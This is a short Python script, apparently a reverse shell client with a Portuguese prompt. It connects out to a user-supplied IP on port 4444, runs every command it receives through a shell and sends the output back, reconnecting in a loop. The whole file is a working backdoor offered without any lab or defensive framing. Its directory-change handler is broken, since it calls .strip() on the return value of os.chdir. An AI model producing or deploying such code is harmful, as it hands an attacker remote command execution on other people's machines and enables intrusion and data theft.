import time
import subprocess
import socket
import os

IP = input("informe seu ip: ")
PORT = 4444

def connect(ip, port):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((ip, port))
        return c
    except Exception as e:
        print(f"error connect: {e}")
        
def cmd(c, data):
    if data.startswith("cd "):
        os.chdir(data[3:]).strip()
        return
        
    try:
        p = subprocess.Popen(
            data,
            shell=True,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE,
        )
        c.send(
            p.stdout.read() + p.stderr.read() + b"\n"
        )
    except Exception as e:
        print(f'cmd function error: {e}')
        
def listen(c):
    try:
        while True:
            data = c.recv(1024).decode().strip()
            if data == "/exit":
                return
            else:
                cmd(c, data)
    except Exception as e:
        print(f'Listen function error: {e}')
 
if __name__ == "__main__":
     try:
         while True:
             client = connect(IP, PORT)
             if client:
                 listen(client)
             else:
                 time.sleep(.5)
     except KeyboardInterrupt:
         print(f"Interrupt... ")
     except Exception as e:
         print(f"Main connection: {e}")
         